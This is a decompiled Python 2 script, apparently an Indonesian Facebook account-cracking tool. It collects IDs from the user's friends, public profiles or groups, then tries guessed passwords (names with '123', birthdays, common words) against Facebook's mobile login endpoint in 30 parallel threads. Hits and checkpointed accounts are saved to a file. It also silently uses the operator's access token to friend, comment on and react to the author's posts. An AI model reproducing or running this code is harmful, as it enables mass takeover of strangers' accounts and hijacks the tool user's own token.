# Deobfuscated by Uncompile
# Created by Frashta Ansari (https://github.com/FrashtaAnsari)
# Instagram : @Frashta

# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Jul  8 2020, 22:44:54) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: <febry>
import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib
from multiprocessing.pool import ThreadPool
from datetime import datetime
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

try:
    import bs4
except ImportError:
    os.system('pip2 install bs4')

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 DILZ-R.py')

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print '[!] Exit'
    os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '%s;' % str(31 + j))

    x += ''
    x = x.replace('!0', '')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.06)


logo = '\x1b[31;1m               \xe2\x96\x84\xe2\x96\x84                \xe2\x96\x97\xe2\x96\x96\n              \xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x8c               \xe2\x96\x90\xe2\x96\x8c\n             \xe2\x96\x90\xe2\x96\x9b    \xe2\x96\x88\xe2\x96\x9f\xe2\x96\x88\xe2\x96\x8c \xe2\x96\x9f\xe2\x96\x88\xe2\x96\x88\xe2\x96\x96 \xe2\x96\x9f\xe2\x96\x88\xe2\x96\x88\xe2\x96\x96\xe2\x96\x90\xe2\x96\x8c\xe2\x96\x9f\xe2\x96\x9b  \xe2\x96\x9f\xe2\x96\x88\xe2\x96\x99  \xe2\x96\x88\xe2\x96\x9f\xe2\x96\x88\xe2\x96\x8c\n             \xe2\x96\x90\xe2\x96\x8c    \xe2\x96\x88\xe2\x96\x98   \xe2\x96\x98\xe2\x96\x84\xe2\x96\x9f\xe2\x96\x8c\xe2\x96\x90\xe2\x96\x9b  \xe2\x96\x98\xe2\x96\x90\xe2\x96\x99\xe2\x96\x88  \xe2\x96\x90\xe2\x96\x99\xe2\x96\x84\xe2\x96\x9f\xe2\x96\x8c \xe2\x96\x88\xe2\x96\x98\n             \xe2\x96\x90\xe2\x96\x99    \xe2\x96\x88   \xe2\x96\x97\xe2\x96\x88\xe2\x96\x80\xe2\x96\x9c\xe2\x96\x8c\xe2\x96\x90\xe2\x96\x8c   \xe2\x96\x90\xe2\x96\x9b\xe2\x96\x88\xe2\x96\x96 \xe2\x96\x90\xe2\x96\x9b\xe2\x96\x80\xe2\x96\x80\xe2\x96\x98 \xe2\x96\x88\n              \xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x8c \xe2\x96\x88   \xe2\x96\x90\xe2\x96\x99\xe2\x96\x84\xe2\x96\x88\xe2\x96\x8c\xe2\x96\x9d\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x8c\xe2\x96\x90\xe2\x96\x8c\xe2\x96\x9d\xe2\x96\x99 \xe2\x96\x9d\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x8c \xe2\x96\x88\n               \xe2\x96\x80\xe2\x96\x80  \xe2\x96\x80    \xe2\x96\x80\xe2\x96\x80\xe2\x96\x9d\xe2\x96\x98 \xe2\x96\x9d\xe2\x96\x80\xe2\x96\x80 \xe2\x96\x9d\xe2\x96\x98 \xe2\x96\x80\xe2\x96\x98 \xe2\x96\x9d\xe2\x96\x80\xe2\x96\x80  \xe2\x96\x80\n\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\n\xe2\x80\xa2 Author  : FRASHTA                                        \xe2\x80\xa2\n\xe2\x80\xa2 Whatsapp: +93794099233                                  \xe2\x80\xa2\n\xe2\x80\xa2 Facebook: FRSHTA                                        \xe2\x80\xa2\n\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2'

def tik():
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m]\x1b[1;93m Sedang Masuk\x1b[1;97m ' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
cpe = []
id = []
username = []
idteman = []
idfromteman = []

def masuk():
    os.system('clear')
    print logo
    print '\x1b[0;32m\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa'
    print '\x1b[33;1m\xe2\x96\xaa 01. Login Menggunakan Token  \xe2\x96\xaa'
    print '\x1b[33;1m\xe2\x96\xaa 00. Keluar                   \xe2\x96\xaa'
    print '\x1b[0;32m\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa\xe2\x96\xaa'
    pilih_masuk()


def pilih_masuk():
    msuk = raw_input('\x1b[32;1m\xe2\x96\x84\xef\xb8\xbb\xe2\x94\xbb\xcc\xbf\xe2\x95\x90\xe2\x94\x81\xe4\xb8\x80 : ')
    if msuk == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Isi Dengan Benar !'
        pilih_masuk()
    elif msuk == '1' or msuk == '01':
        tokenz()
    elif msuk == '0' or msuk == '00':
        keluar()
    else:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Isi Dengan Benar !'
        pilih_masuk()


def tokenz():
    os.system('clear')
    print logo
    toket = raw_input('\x1b[1;97m[\x1b[1;39m?\x1b[1;97m] \x1b[31;1mToken : \x1b[31;1m')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        jalan('\x1b[1;97mIKLAN DULU BRO !!!')
        print '\x1b[1;97m[\x1b[1;39m\xe2\x9c\x93\x1b[1;97m]\x1b[1;39m Follow Dulu Bro'
        os.system('xdg-open  https://www.facebook.com/profile.php?id=757953543')
        bot_komen()
    except KeyError:
        print '\x1b[1;97m[\x1b[1;39m!\x1b[1;97m] \x1b[1;39mToken Salah !'
        time.sleep(1)
        masuk()


def bot_komen():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;39m[!] Token invalid'
        os.system('rm -rf login.txt')

    una = '757953543'
    kom = 'Mantap Bro \xe2\x98\xba\xef\xb8\x8f'
    reac = 'LOVE'
    post = '10158510109553544'
    post2 = '10158807643598544'
    kom2 = 'Keren Bro \xe2\x98\xba\xef\xb8\x8f'
    reac2 = 'LOVE'
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=' + reac2 + '&access_token=' + toket)
    menu()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        os.system('rm -rf login.txt')
        masuk()

    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()
    except requests.exceptions.ConnectionError:
        print '[!] Tidak Ada Koneksi'
        keluar()

    os.system('clear')
    print logo
    print 30 * '\x1b[0;32m\xe2\x96\xaa'
    print '\x1b[0;32m\xe2\x96\xaa \x1b[33;1m[\x1b[33;1m\xe2\x9c\x93\x1b[33;1m]\x1b[33;1m Nama \x1b[33;1m: \x1b[33;1m' + nama + '\x1b[33;1m       \x1b[0;32m    \xe2\x96\xaa '
    print '\x1b[0;32m\xe2\x96\xaa \x1b[33;1m[\x1b[33;1m\xe2\x9c\x93\x1b[33;1m]\x1b[33;1m ID   \x1b[33;1m: \x1b[33;1m' + id + '\x1b[33;1m \x1b[0;32m\xe2\x96\xaa'
    print 30 * '\x1b[0;32m\xe2\x96\xaa'
    print '\x1b[0;32m\xe2\x96\xaa \x1b[33;1m1.\x1b[33;1m Crack Facebook    \x1b[0;32m      \xe2\x96\xaa'
    print '\x1b[0;32m\xe2\x96\xaa \x1b[33;1m0.\x1b[33;1m Logout          \x1b[0;32m        \xe2\x96\xaa'
    print 30 * '\x1b[0;32m\xe2\x96\xaa'
    pilih()


def pilih():
    unikers = raw_input('\n\x1b[1;97m\xe2\x96\x84\xef\xb8\xbb\xcc\xb7\xcc\xbf\xe2\x94\xbb\xcc\xbf\xe2\x95\x90\xe2\x94\x81\xe4\xb8\x80 : \x1b[1;97m')
    if unikers == '':
        print '\x1b[1;96m[!] \x1b[1;91mHarap Isi Dengan benar! '
        pilih()
    elif unikers == '1':
        super()
    elif unikers == '2':
        super()
    elif unikers == '0':
        os.system('clear')
        jalan('Menghapus token')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;96m[!] \x1b[1;91mIsi Dengan benar!'
        pilih()


def super():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print 30 * '\x1b[0;32m\xe2\x96\xaa'
    print '\x1b[0;32m\xe2\x96\xaa \x1b[33;1m1.\x1b[33;1m Crack Dari Daftar Teman \x1b[0;32m\xe2\x96\xaa'
    print '\x1b[0;32m\xe2\x96\xaa \x1b[33;1m2.\x1b[33;1m Crack Dari Id Publik    \x1b[0;32m\xe2\x96\xaa'
    print '\x1b[0;32m\xe2\x96\xaa \x1b[33;1m0.\x1b[33;1m Kembali                 \x1b[0;32m\xe2\x96\xaa'
    print 30 * '\x1b[0;32m\xe2\x96\xaa'
    pilih_super()


def pilih_super():
    global cekpoint
    global oks
    peak = raw_input('\n\x1b[0;32m\xe2\x96\x84\xef\xb8\xbb\xcc\xb7\xcc\xbf\xe2\x94\xbb\xcc\xbf\xe2\x95\x90\xe2\x94\x81\xe4\xb8\x80 : \x1b[1;97m')
    if peak == '':
        print '\x1b[1;96m[!] \x1b[1;91mIsi Dengan benar'
        pilih_super()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            print 42 * '\x1b[1;96\xe2\x96\xaa'
            jalan('\x1b[1;96m[\xe2\x80\xa2] \x1b[1;93mMengambil ID \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif peak == '2':
            os.system('clear')
            print logo
            print 42 * '\x1b[1;96m\xe2\x96\xaa'
            idt = raw_input('\x1b[1;96m[\xe2\x88\x9a] \x1b[1;93mMasukan ID Publik \x1b[1;91m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;93mNama teman\x1b[1;91m :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;96m[!] \x1b[1;91mId Tidak Ditemukan!'
                raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
                super()

            jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mMengambil ID \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif peak == '00003':
            os.system('clear')
            print logo
            print 42 * '\x1b[1;96m\xe2\x96\xaa'
            idg = raw_input('\x1b[1;96m[+] \x1b[1;93mMasukan ID Group \x1b[1;91m:\x1b[1;97m ')
            try:
                r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                asw = json.loads(r.text)
                print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;93mNama group \x1b[1;91m:\x1b[1;97m ' + asw['name']
            except KeyError:
                print '\x1b[1;96m[!] \x1b[1;91mGroup Tidak Ditemukan'
                raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
                super()

            jalan('\x1b[1;96m[\xe2\x80\xa2] \x1b[1;93mMengambil ID \x1b[1;97m...')
            re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
            s = json.loads(re.text)
            for p in s['data']:
                id.append(p['id'])

        elif peak == '00004':
            os.system('clear')
            print logo
            print 42 * '\x1b[1;96m\xe2\x96\xaa'
            try:
                idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mMasukan Nama File  \x1b[1;91m: \x1b[1;97m')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except IOError:
                print '\x1b[1;96m[!] \x1b[1;91mFile Tidak Ditemukan'
                raw_input('\n\x1b[1;96m[ \x1b[1;97mKembali \x1b[1;96m]')
                super()

        elif peak == '0':
            menu()
        else:
            print '\x1b[1;96m[!] \x1b[1;91mIsi Dengan Benar'
            pilih_super()
        print '\x1b[1;96m[\xe2\x88\x9a] \x1b[1;93mTotal ID \x1b[1;91m: \x1b[1;97m' + str(len(id))
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;96m[\x1b[1;97m\xe2\x80\xa2\x1b[1;96m] \x1b[1;93mCrack \x1b[1;97m' + o,
            sys.stdout.flush()
            time.sleep(1)

    print
    print 42 * '\x1b[1;96m\xe2\x96\xaa'

    def main(arg):
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mChekpoint'
                print '\x1b[1;96m[\xce\xa9] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
                print '\x1b[1;96m[\xe2\x99\xaa] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
                print '\x1b[1;96m[\xe2\x99\xaa] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass1 + '\n'
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;96m[\xe2\x9c\x96] \x1b[1;93mChekpoint'
                print '\x1b[1;96m[\xce\xa9] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
                print '\x1b[1;96m[\xe2\x99\xaa] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
                print '\x1b[1;96m[\xe2\x99\xaa] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass1 + '\n'
                cek = open('out/super_cp.txt', 'a')
                cek.write('ID:' + user + ' Pw:' + pass1 + '\n')
                cek.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = b['first_name'] + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mBerhasil'
                    print '\x1b[1;96m[\xce\xa9] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
                    print '\x1b[1;96m[\xe2\x99\xaa] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
                    print '\x1b[1;96m[\xe2\x99\xaa] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass2 + '\n'
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;96m[\xe2\x9c\x96] \x1b[1;93mChekpoint'
                    print '\x1b[1;96m[\xce\xa9] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
                    print '\x1b[1;96m[\xe2\x99\xaa] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
                    print '\x1b[1;96m[\xe2\x99\xaa] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass2 + '\n'
                    cek = open('out/super_cp.txt', 'a')
                    cek.write('ID:' + user + ' Pw:' + pass2 + '\n')
                    cek.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = b['last_name'] + '123'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mBerhasil'
                        print '\x1b[1;96m[\xce\xa9] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
                        print '\x1b[1;96m[\xe2\x99\xaa] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
                        print '\x1b[1;96m[\xe2\x99\xaa] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass3 + '\n'
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;96m[\xe2\x9c\x96] \x1b[1;93mChekpoint'
                        print '\x1b[1;96m[\xce\xa9] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
                        print '\x1b[1;96m[\xe2\x99\xaa] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
                        print '\x1b[1;96m[\xe2\x99\xaa] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass3 + '\n'
                        cek = open('out/super_cp.txt', 'a')
                        cek.write('ID:' + user + ' Pw:' + pass3 + '\n')
                        cek.close()
                        cekpoint.append(user + pass3)
                    else:
                        pass4 = 'Bangsat'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mBerhasil'
                            print '\x1b[1;96m[\xce\xa9] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
                            print '\x1b[1;96m[\xe2\x99\xaa] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
                            print '\x1b[1;96m[\xe2\x99\xaa] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass4 + '\n'
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;96m[\xe2\x9c\x96] \x1b[1;93mChekpoint'
                            print '\x1b[1;96m[\xce\xa9] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
                            print '\x1b[1;96m[\xe2\x99\xaa] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
                            print '\x1b[1;96m[\xe2\x99\xaa] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass4 + '\n'
                            cek = open('out/super_cp.txt', 'a')
                            cek.write('ID:' + user + ' Pw:' + pass4 + '\n')
                            cek.close()
                            cekpoint.append(user + pass4)
                        else:
                            birthday = b['birthday']
                            pass5 = birthday.replace('/', '')
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mBerhasil'
                                print '\x1b[1;96m[\xce\xa9] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
                                print '\x1b[1;96m[\xe2\x99\xaa] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
                                print '\x1b[1;96m[\xe2\x99\xaa] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass5 + '\n'
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;96m[\xe2\x9c\x96] \x1b[1;93mChekpoint'
                                print '\x1b[1;96m[\xce\xa9] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
                                print '\x1b[1;96m[\xe2\x99\xaa] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
                                print '\x1b[1;96m[\xe2\x99\xaa] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass5 + '\n'
                                cek = open('out/super_cp.txt', 'a')
                                cek.write('ID:' + user + ' Pw:' + pass5 + '\n')
                                cek.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = 'Sayang'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mBerhasil'
                                    print '\x1b[1;96m[\xce\xa9] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
                                    print '\x1b[1;96m[\xe2\x99\xaa] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
                                    print '\x1b[1;96m[\xe2\x99\xaa] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass6 + '\n'
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;96m[\xe2\x9c\x96] \x1b[1;93mChekpoint'
                                    print '\x1b[1;96m[\xce\xa9] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
                                    print '\x1b[1;96m[\xe2\x99\xaa] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
                                    print '\x1b[1;96m[\xe2\x99\xaa] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass6 + '\n'
                                    cek = open('out/super_cp.txt', 'a')
                                    cek.write('ID:' + user + ' Pw:' + pass6 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass6)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;92mSelesai \x1b[1;97m....'
    print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mTotal OK/\x1b[1;93mCP \x1b[1;91m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mCP File tersimpan \x1b[1;91m: \x1b[1;97mout/super_cp.txt'
    raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
    super()


def grupsaya():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    try:
        os.mkdir('out')
    except OSError:
        pass

    os.system('clear')
    print logo
    print 42 * '\x1b[1;96m='
    try:
        uh = requests.get('https://graph.facebook.com/me/groups?access_token=' + toket)
        gud = json.loads(uh.text)
        for p in gud['data']:
            nama = p['name']
            id = p['id']
            f = open('out/Grupid.txt', 'w')
            listgrup.append(id)
            f.write(id + '\n')
            print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mGROUP SAYA'
            print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID  \x1b[1;91m: \x1b[1;92m' + str(id)
            print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mNama\x1b[1;91m: \x1b[1;92m' + str(nama) + '\n'

        print 42 * '\x1b[1;96m='
        print '\x1b[1;96m[+] \x1b[1;92mTotal Group \x1b[1;91m:\x1b[1;97m %s' % len(listgrup)
        print '\x1b[1;96m[+] \x1b[1;92mTersimpan \x1b[1;91m: \x1b[1;97mout/Grupid.txt'
        f.close()
        raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
        menu()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;96m[!] \x1b[1;91mTerhenti'
        raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
        menu()
    except KeyError:
        os.remove('out/Grupid.txt')
        print '\x1b[1;96m[!] \x1b[1;91mGroup tidak ditemukan'
        raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
